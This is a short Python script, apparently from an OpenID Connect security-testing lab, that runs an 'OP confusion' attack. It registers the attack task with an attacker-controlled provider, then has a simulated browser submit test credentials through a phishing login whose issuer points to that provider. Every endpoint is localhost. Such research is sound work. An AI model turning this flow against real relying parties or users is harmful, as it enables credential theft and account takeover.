import sys
import os
import time

sys.path.append(os.path.join(os.path.dirname(__file__), '../../src'))

from browser import BrowserSimulator
from attacker_op import AttackerOPClient
import id_token

ATTACKER_OP_ENDPOINT = "http://localhost:9997"
HONEST_OP_ENDPOINT = "http://localhost:9998"
HONEST_RP_ENDPOINT = "http://localhost:9999"
PROXY_SERVER_ENDPOINT = "http://localhost:8080"

attakcer_op_client = AttackerOPClient(ATTACKER_OP_ENDPOINT)

try:
    # add task to attacker op
    name = 'OPConfusion'
    args = {
        'honest_op_auth_endpoint': f'{HONEST_OP_ENDPOINT}/auth'
    }
    task_id = attakcer_op_client.add_task(name, args)
    print(task_id)

    time.sleep(5)

     # victim credentials
    victim_username = 'test-user@localhost'
    victim_password = 'verysecure'

    # browser simulation
    sso_flow = f"""
page.locator('input[name="username"]').fill('{victim_username}')
page.locator('input[name="password"]').fill('{victim_password}')
page.locator('button[type="submit"]').click()
print(page.content())
    """
    
    # fishing login
    simulator = BrowserSimulator(f'{HONEST_RP_ENDPOINT}/login?issuer={ATTACKER_OP_ENDPOINT}/', PROXY_SERVER_ENDPOINT)
    simulator.run(sso_flow)
    simulator.close()

    attakcer_op_client.delete_task()
except Exception as e:
    print('Error:', e)
    attakcer_op_client.delete_task()